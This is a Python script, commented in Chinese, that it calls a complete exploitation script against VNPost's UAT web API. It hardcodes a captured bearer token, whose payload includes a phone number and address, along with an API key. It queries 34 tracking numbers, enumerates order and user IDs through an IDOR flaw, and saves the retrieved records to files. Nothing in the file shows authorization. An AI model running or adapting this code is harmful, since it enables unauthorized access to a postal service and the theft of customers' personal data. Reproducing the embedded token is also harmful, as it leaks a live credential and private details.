#!/usr/bin/env python3
"""
VNPost UAT 完整利用脚本
使用真实Token访问所有API
"""

import requests
import json
import urllib3
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

# 配置
BASE_URL = "https://my-uat.vnpost.vn"
TOKEN = "eyJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJKRmNhcC1XZWJBcGkiLCJleHAiOjE3NjIxOTgwMTQsIm5iZiI6MTc2MjE5NDExNCwiaWF0IjoxNzYyMTk0MTE0LCJhaWQiOiJNWVZOUCIsInVpZCI6Ik1ZVk5QX0NfMzkxNSIsInVmbiI6Ik9jYiIsIm9yZyI6IkMwMDAzNjMzMDUiLCJkaWQiOiJjODFkZjM5NDhiMjlmNmIyOTQzZjgwMzU3YTlhMmNkMiIsImxjcCI6MTY4ODEwNTgwMjAwMCwiZXhwaXJhdGlvbkRhdGUiOjkwLCJpc0VtcGxveWVlIjpmYWxzZSwib3duZXIiOiJNWVZOUF9DXzM5MTUiLCJwaG9uZU51bWJlciI6Iis4NDk4MjcyMjg5MiIsImFkZHIiOiI0MEEgw5p0IFTDrWNoLCBQaMaw4budbmcgNCIsInByb3YiOiI3MCIsImRpc3QiOiI3MjEwIiwiY29tbSI6IjcyMTA2Iiwib3MiOiJXRUIiLCJpc0ZpcnN0TG9naW4iOmZhbHNlfQ.7D7ID3FvbzvWIDI8XaTqgXd6qgoVA0x2RzYlYW3rEc6QLB35eFcrsPJCnKXK9en-4EGcN380EZNaj458FxBkPA"
API_KEY = "19001111"

HEADERS = {
    'Authorization': TOKEN,
    'cApiKey': API_KEY,
    'Content-Type': 'application/json',
}

# 34个运单号
TRACKING_NUMBERS = [
    "EF043571075VN", "EF043590790VN", "EB102964844VN", "EB102885483VN",
    "EC149780335VN", "EF043571495VN", "EF043579295VN", "EF043571084VN",
    "EC149780344VN", "EF043571504VN", "EF043579304VN", "EF043590809VN",
    "EF043571098VN", "EB102885506VN", "EF043571518VN", "EF043579318VN",
    "EC149780358VN", "EF043571521VN", "EB102885510VN", "EF043571107VN",
    "EF043579321VN", "EC149780361VN", "EF043590826VN", "EF043571115VN",
    "EF043590830VN", "EF043571535VN", "EC149780375VN", "EF043571124VN",
    "EF043590843VN", "EF043579349VN", "EF043579352VN", "EB102964901VN",
    "EF043571138VN", "EC149780389VN"
]

def test_endpoint(method, endpoint, data=None):
    """测试单个端点"""
    try:
        url = f"{BASE_URL}{endpoint}"
        
        if method == 'GET':
            r = requests.get(url, headers=HEADERS, timeout=10, verify=False)
        elif method == 'POST':
            r = requests.post(url, json=data, headers=HEADERS, timeout=10, verify=False)
        else:
            return None
            
        if r.status_code == 200:
            try:
                return r.json()
            except:
                return r.text if len(r.text) > 50 else None
    except:
        pass
    return None

def query_tracking(tracking_number):
    """查询单个运单号"""
    endpoints = [
        "/myvnp-app/v1/tracking/search",
        "/myvnp-app/api/tracking/search",
        "/myvnp-app/v1/orders/tracking",
    ]
    
    for endpoint in endpoints:
        result = test_endpoint('POST', endpoint, {"trackingNumber": tracking_number})
        if result:
            return {
                'tracking_number': tracking_number,
                'endpoint': endpoint,
                'data': result
            }
    return None

def enumerate_orders(max_id=100):
    """枚举订单ID"""
    found = []
    
    for order_id in range(1, max_id + 1):
        result = test_endpoint('GET', f"/myvnp-app/v1/orders/{order_id}")
        if result:
            found.append({'order_id': order_id, 'data': result})
            
    return found

def enumerate_users(max_id=100):
    """枚举用户ID"""
    found = []
    
    for user_id in range(1, max_id + 1):
        result = test_endpoint('GET', f"/myvnp-app/v1/users/{user_id}")
        if result:
            found.append({'user_id': user_id, 'data': result})
            
    return found

def main():
    print("="*70)
    print(" VNPost UAT 完整利用")
    print("="*70)
    
    # 1. 获取菜单
    print("\n[1] 获取用户菜单...")
    menu = test_endpoint('GET', '/myvnp-app/v1/McasMenu/getMenuAccessAllByCurrentUser')
    if menu:
        print(f"✅ 菜单数据: {json.dumps(menu, ensure_ascii=False)[:500]}")
    
    # 2. 查询所有运单号
    print("\n[2] 查询34个运单号...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(query_tracking, TRACKING_NUMBERS))
    
    found_tracking = [r for r in results if r]
    print(f"✅ 找到 {len(found_tracking)} 个运单有数据")
    
    if found_tracking:
        with open('vnpost_tracking_results.json', 'w') as f:
            json.dump(found_tracking, f, indent=2, ensure_ascii=False)
        print("✅ 已保存到 vnpost_tracking_results.json")
    
    # 3. IDOR - 枚举订单
    print("\n[3] IDOR测试 - 枚举订单...")
    orders = enumerate_orders(50)
    print(f"✅ 找到 {len(orders)} 个订单")
    
    if orders:
        with open('vnpost_orders_idor.json', 'w') as f:
            json.dump(orders, f, indent=2, ensure_ascii=False)
        print("✅ 已保存到 vnpost_orders_idor.json")
    
    # 4. IDOR - 枚举用户
    print("\n[4] IDOR测试 - 枚举用户...")
    users = enumerate_users(50)
    print(f"✅ 找到 {len(users)} 个用户")
    
    if users:
        with open('vnpost_users_idor.json', 'w') as f:
            json.dump(users, f, indent=2, ensure_ascii=False)
        print("✅ 已保存到 vnpost_users_idor.json")
    
    print("\n" + "="*70)
    print("✅ 利用完成！")
    print("="*70)

if __name__ == '__main__':
    main()
